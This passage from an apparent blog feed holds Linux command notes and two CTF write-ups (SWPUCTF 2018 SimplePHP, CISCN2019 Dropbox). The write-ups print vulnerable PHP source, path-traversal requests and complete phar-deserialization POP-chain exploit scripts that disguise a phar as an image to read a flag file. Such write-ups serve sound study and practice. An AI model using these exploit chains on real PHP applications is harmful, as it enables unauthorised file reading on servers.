选项</p><p>适用于大多数外部命令</p><p>adduser 添加用户账号</p><p>passwd 设置(更改)用户口令</p><p>userdel 删除用户账号(及宿主目录)</p><p>usermod 设置用户属性</p><p> [root@o213 ~]# adduser admin  //增加用户</p><p>[root@o213 ~]# passwd admin  //修改admin的密码</p><p>[root@o213 ~]# passwd admin<br>更改用户 admin 的密码 。<br>新的密码：<br>重新输入新的密码：<br>passwd：所有的身份验证令牌已经成功更新。</p><p>[root@o213 ~]# usermod -L admin  锁定admin账号<br>[root@o213 ~]# userdel admin 删除admin账号</p><p>用户的账号信息保存在 /etc/passwd  文件中</p><p>tail -1 /etc/passwd   //从后往前显示一行</p><p>用户的加密口令保存在 /etc/shadow  文件中</p><p>tail -1 /etc/shadow</p><p>用户的宿主目录(家目录)在 /home 下</p><p>tail -1 /etc/home</p><p>切换用户</p><p>su admin  //切换到admin用户</p><p>组命令：</p><p>groupadd  添加指定名称的用户组账号</p><p>groupdel  删除指定名称的用户组账号</p><p>文件</p><p>/etc/group  保存用户组账号信息</p><pre><code>groupadd shuihugroupadd honglouuseradd -g shuihu wusong  //创建wusong用户并指定到shuihu组useradd -g honglou jiabaoyu //创建jiaobaoyu组并指定到honglou组groupadd daxia usermod -g daxia wusong //将wusong这个用户从shuihu组移到daxia组groupdel daxia  //删除组</code></pre><p><img src="/2021/11/12/Linux/image-20211113001359900.png" alt="image-20211113001359900"></p><p><img src="/2021/11/12/Linux/image-20211113001715071.png" alt="image-20211113001715071"></p><p>增加文件所有者的执行权限</p><p>chmod u+x anaconda-ks.cfg  </p><p>去除文件所属组的写权限</p><p>chmod g-w lshelp.txt</p><p>设置其他用户的文件权限为可执行</p><p>chmod o=x lshelp.txt</p><p>追加所有账号权限可读</p><p>chmod a+r anaconda-ks.cfg</p><p>chown命令：</p><p>设置文件的所以者为wusong，让所属组也跟着改</p><p>chown wusong:lshelp.txt</p><p>设置文件的所以者为root，所属组不改</p><p>chown root lshelp.txt</p><p>设置文件的所属组</p><p>chown : root lshelp.txt</p><p>查看及切换目录</p><p>pwd、cd、ls、du</p><p>pwd：查看工作目录</p><p>[root@o213 ~]# pwd<br>/root</p><p>cd：切换目录</p><p>cd ~  回家</p><p>ls：显示目录内容</p><p>ls -l:以长格式显示</p><p>ls -a:显示所有子目录和文件的信息，包括隐藏文件</p><p>ls -A:类似于”-a”,但不显示”.”和”..”目录的信息</p><p>ls -d:显示目录本身的属性</p><p>ls -h:以更易读的字节单位(K、M等)显示信息</p><p>ls -R:递归显示内容</p><p>ls –color:以颜色区分不同类型文件</p><p>创建目录和文件</p><p>mkdir、touch、In</p><p>mkdir a/b/c/d  创建多层目录 </p><p>touch aa.txt 创建一个空文件</p><p>ln：为文件或目录建立链接</p><pre><code>[root@o213 ~]# ln -s /usr/bin/ls aa[root@o213 ~]# lsaa  anaconda-ks.cfgln lshelp.txt abc //建立硬链接</code></pre><p>符号链接：指向原始文件所在的路径，又称为软链接</p><p>硬链接：</p><p>指向原始文件对应的数据存储位置</p><p>不能为目录建立硬链接文件</p><p>硬链接与原始文件必须位于同一分区(文件系统)</p><p>可以使用stat命令查看：</p><pre><code>[root@o213 ~]# touch sakura.txt[root@o213 ~]# lsaa  anaconda-ks.cfg  sakura.txt[root@o213 ~]# ln sakura.txt dd[root@o213 ~]# state dd-bash: state：未找到命令[root@o213 ~]# stat dd  文件：dd  大小：0               块：0          IO 块：4096   普通空文件设备：fd00h/64768d      Inode：786445      硬链接：2权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)环境：unconfined_u:object_r:admin_home_t:s0最近访问：2021-11-13 01:10:30.704162871 +0800最近更改：2021-11-13 01:10:30.704162871 +0800最近改动：2021-11-13 01:10:58.974385168 +0800创建时间：2021-11-13 01:10:30.703162863 +0800[root@o213 ~]# stat sakura.txt  文件：sakura.txt  大小：0               块：0          IO 块：4096   普通空文件设备：fd00h/64768d      Inode：786445      硬链接：2权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)环境：unconfined_u:object_r:admin_home_t:s0最近访问：2021-11-13 01:10:30.704162871 +0800最近更改：2021-11-13 01:10:30.704162871 +0800最近改动：2021-11-13 01:10:58.974385168 +0800创建时间：2021-11-13 01:10:30.703162863 +0800</code></pre><p>复制、删除、移动目录和文件</p><p>cp、rm、mv</p><p>cp: </p><p>-r：递归复制整个目录树</p><p>-p:保持源文件的属性不变</p><p>-f:强制覆盖目标同名文件或目录</p><p>-i:需要覆盖文件或目录时进行提醒</p><p>查找目录和文件</p><p>which、find</p><p>通配符：</p><p>*  代替零个、单个或多个字符</p><p>?  代替一个字符</p><p>alias 定义别名：</p><p>alias myls=’ls -alh’</p><p>du:</p><p>统计目录及文件的空间占用清空</p><p>-a:统计时包括所有的文件，而不仅仅只统计目录</p><p>-h:以更容读的字节单位(K、M等)显示信息</p><p>-s:只统计每个参数所占用空间的总的大小</p><p>如：</p><p>du -sh /home/</p><pre><code>[root@o213 ~]# du -sh /home/60K     /home/</code></pre><p>find 命令</p><p>比如：</p><p>find /etc -name “re*.conf”</p><p>从/etc 目录找这个文件</p><p>-name:按文件名称查找</p><p>-size:按文件大小查找</p><p>-user：按文件属主查找</p><p>-type：按文件类型查找</p><p><img src="/2021/11/12/Linux/image-20211121230756940.png" alt="image-20211121230756940"></p><p><img src="/2021/11/12/Linux/image-20211121231009685.png" alt="image-20211121231009685"></p><p><img src="/2021/11/12/Linux/image-20211121231235005.png" alt="image-20211121231235005"></p><p><img src="/2021/11/12/Linux/image-20211121231510277.png" alt="image-20211121231510277"></p><p><img src="/2021/11/12/Linux/image-20211121232610276.png" alt="image-20211121232610276"></p><p><img src="/2021/11/12/Linux/image-20211121233634742.png" alt="image-20211121233634742"></p><p><img src="/2021/11/12/Linux/image-20211121233758176.png" alt="image-20211121233758176"></p><p><img src="/2021/11/12/Linux/image-20211121234948834.png" alt="image-20211121234948834"></p><p><img src="/2021/11/12/Linux/image-20211122000239414.png" alt="image-20211122000239414"></p><p><img src="/2021/11/12/Linux/image-20211122001630415.png" alt="image-20211122001630415"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/11/12/Linux/image-20211112001054678.png&quot; alt=&quot;image-20211112001054678&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/11/12/Linux/image-20211112</summary>
      
    
    
    
    <category term="Linux" scheme="https://sakurahack-y.github.io/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://sakurahack-y.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF 2018 SimplePHP_0x50-0x5F</title>
    <link href="https://sakurahack-y.github.io/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/"/>
    <id>https://sakurahack-y.github.io/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/</id>
    <published>2021-11-07T13:49:10.000Z</published>
    <updated>2021-11-07T14:36:36.082Z</updated>
    
    <content type="html"><![CDATA[<p>如图，只有两个功能点，查看文件和上传文件</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215628202.png" alt="image-20211107215628202"></p><p>上传文件功能点只能上传图片。</p><p>点击查看链接观察url</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=</a></p><p>尝试在file后加一些东西</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=index.php</a></p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215818863.png" alt="image-20211107215818863"></p><p>surprise!</p><p>继续，依次读取各个页面的源码</p><p>file.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt; </code></pre><p>function.php</p><pre><code class="php">&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;        &#125;public function __wakeup()&#123;    if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;        echo &quot;hacker~&quot;;        $this-&gt;source = &quot;index.php&quot;;    &#125;&#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt;</code></pre><p>首先观察敏感函数，我们发现了file_get_contents()，如何利用它呢，我们尝试寻找可以反序列的点。</p><p>但是本文中并没unserialize，这时候我们就可以采用phar://协议，可以达到反序列化的效果。</p><p>下面我们就要考虑，如何利用file_get_contens()这个敏感函数。</p><p>反序列化，最重要的就算里面的一些魔术方法，我们可以进行调用。</p><p>__toString  在echo一个类的时候调用</p><p>__get   未定义的属性或没有权限访问的属性被访问时该方法会被调用</p><p>下面我们来尝试构建pop利用链。</p><p>我们全局搜索$value这个变量，发现它是由get穿过来的</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220543645.png" alt="image-20211107220543645"></p><p> 我们的目标是什么呢？</p><p>使$value可控！</p><p>我们再全局搜索$key并没有发现可以传入的地方，那么说明它不受我们控制。</p><p>那我们就要突破这个点。</p><p>如何构造，使它受我们控制。</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107220958104.png" alt="image-20211107220958104"></p><p>我们可以使用这个魔术方法：</p><p>当我们在Test()这个类中调用一个不存在的属性的时候就会调用它，因此我们可以通过这个方法来传入我们想要的东西。</p><p>那么如何调用Test()呢？</p><p>我们可以发现：</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221351753.png" alt="image-20211107221351753"></p><p>Test()类中不存在source，我们可以令str[‘str’] = new Test() 来调用。</p><p>而调用__toString，又需要echo这个类</p><p>我们可以利用这里</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107221800425.png" alt="image-20211107221800425"></p><p>好了，上面我们都是逆推，现在我们可以理一下pop链的顺序。</p><p>调用C1e4r()中的魔术方法__destruct  ——-    调用Show()中的 toString()  ———     传入Test调用不存在的属性从而调用 get</p><p>pop链代码如下:</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a = new C1e4r();$b = new Show();$c = new Test();$a-&gt;str = $b;$b-&gt;str[&#39;str&#39;] = $c; //因为这里会调用source,从而会调用下边的source，所以下边的params也要接受$source$this-&gt;params[$source] = &#39;/var/www/html/f1ag.php&#39;;@unlink(&quot;sakura.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>放在本地环境，访问，会生成一个sakura.phar文件</p><p>发现无法上传，将后缀改为.gif</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223436308.png" alt="image-20211107223436308"></p><p>上传后。</p><p>访问</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E5%90%8D">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload可以获得文件名</a></p><p>然后利用phar解析</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg</a></p><p>获得flag</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223535835.png" alt="image-20211107223535835"></p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223555802.png" alt="image-20211107223555802"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如图，只有两个功能点，查看文件和上传文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107215628202.png&quot; alt=&quot;image-20211107215628</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="反序列化" scheme="https://sakurahack-y.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="phar协议" scheme="https://sakurahack-y.github.io/tags/phar%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web1 Dropbox _0x41-0x4F</title>
    <link href="https://sakurahack-y.github.io/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/"/>
    <id>https://sakurahack-y.github.io/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/</id>
    <published>2021-10-27T16:53:32.000Z</published>
    <updated>2021-10-27T17:50:49.520Z</updated>
    
    <content type="html"><![CDATA[<p>题目给出的是一个登录框，并且有注册操作</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005613695.png" alt="image-20211028005613695"></p><p>我们可以先注册个账号登录下</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005651708.png" alt="image-20211028005651708"></p><p>有上传文件的功能，尝试文件上传，发现写死了，只允许图片上传。</p><p>那我们先上传个图片看一看</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005810078.png" alt="image-20211028005810078"></p><p>增加了两个功能，下载和删除</p><p>抓包来看一看</p><pre><code>POST /download.php HTTP/1.1Host: dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 26Origin: http://dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81Connection: closeReferer: http://dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81/index.phpCookie: UM_distinctid=17ba73558f3490-0c95ed277ed4498-4c3f217f-144000-17ba73558f4710; PHPSESSID=ad225e350fb42f426122effecd7c8b7cfilename=w5w.jpg</code></pre><p>这里有个关键点filename=w5w.jpg，我们可以尝试将w5w.jpg改为别的文件名称</p><p>首先改为 ../../index.php</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011042791.png" alt="image-20211028011042791"></p><p>成功读取到了index.php的源码。</p><p>这时候尝试盲猜路径读取flag，并没有什么结果。那就读取下其他源码看一看吧</p><p>依次读取了</p><p>index.php,download.php,delete.php,class.php</p><p>index.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION[&#39;sandbox&#39;]);$a-&gt;Name();$a-&gt;Size();?&gt;</code></pre><p>这个里面没有什么有价值的东西</p><p>class.php</p><pre><code class="php">&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db = $db;    &#125;    public function user_exist($username) &#123;        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count = $stmt-&gt;num_rows;        if ($count === 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect === $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files = array();        $this-&gt;results = array();        $this-&gt;funcs = array();        $filenames = scandir($path);        $key = array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key = array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file = new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] = array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table = &#39;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .= &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;/th&gt;&#39;;        &#125;        $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#39;;        $table .= &#39;&lt;/thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename =&gt; $result) &#123;            $table .= &#39;&lt;tr&gt;&#39;;            foreach ($result as $func =&gt; $value) &#123;                $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;;            &#125;            $table .= &#39;&lt;td class=&quot;text-center&quot; filename=&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#39;;            $table .= &#39;&lt;/tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename = $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size = filesize($this-&gt;filename);        $units = array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>很多函数，最关键的是我们发现了 file_get_contents,这应该是题目的突破点</p><p>download.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123;    Header(&quot;Content-type: application/octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>这里可以看到flag被过滤了，所以我们是无法直接读取flag的</p><p>delete.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>存在任意文件下载漏洞，相应也存在任意文件删除漏洞。这里的意思不过返回True与False，没有发现什么有用的地方。</p><p>接下来我们来审计一下代码。</p><p>利用点：</p><pre><code class="php">public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;</code></pre><p>看一下哪些地方调用了close函数</p><p>download.php中的</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011750225.png" alt="image-20211028011750225"></p><p>class.php的user类里面存在</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011814557.png" alt="image-20211028011814557"></p><p>这里执行的实际是关闭数据库的操作，但是有趣的是它和我们需要调用的函数重名。</p><p>download.php存在过滤，无法使用，所以我们尝试使用class.php中的魔术方法__destruct()来调用</p><p>如何调用__destruct()魔术方法呢，也就是如何调用对象呢，必须使用反序列化</p><p>但是整个代码中并没有出现过unserialize()这个函数，所以我们并不能直接进行序列化。</p><p>这时候就可以利用phar://伪协议，可以不依赖unserialize()直接进行反序列化操作.</p><p>关于phar的讲解可以看另外一篇博客：</p><p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p>审计代码，我们可以发现一个很有趣的魔术方法：</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028012434528.png" alt="image-20211028012434528"></p><p>它在什么时候调用呢？</p><p>这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在的方法，__call 方法将会被自动调用</p><p>这里__call的代码的意思就是如果调用的对象不存在，就会把这个函数写入$this-&gt;funcs,并且遍历文件，让每一个文件执行一遍这个函数。</p><p>因此我们的思路就清晰了一点。</p><p>首先反序列化一个类，这个类不存在close()方法(如果存在的话就不需要这么复杂了)，然后对这个类调用close()方法，因为它不存在，所以会调用__call魔术方法，call魔术方法就可以调用close方法，从而完成file_get_contents函数的利用。</p><p>所以操作就是：</p><p>反序列化$user</p><p>调用完成，对象被销毁时，调用函数__destruct魔术方法</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011814557.png" alt="image-20211028011814557"></p><p>使$user -&gt; db = FileList()</p><p>FileList这个类调用close(),不存在，调用__call方法，调用close()</p><p>接下来就可以来构建pop链：</p><pre><code class="php">&lt;?phpclass User &#123;public $db;public function __construct() &#123;        $this-&gt;db = new FileList();    &#125;&#125;class FileList &#123;        private $files;    private $results;    private $funcs;    public function __construct() &#123;        $this-&gt;files = array(new File());        $this-&gt;results = array();        $this-&gt;funcs = array();    &#125;&#125;class File &#123;    public $filename = &#39;/flag.txt&#39;;&#125;$user = new User;@unlink(&quot;sakura.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($user); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>运行得到sakura.phar文件，修改后缀为sakura.jpg，上传</p><p><img 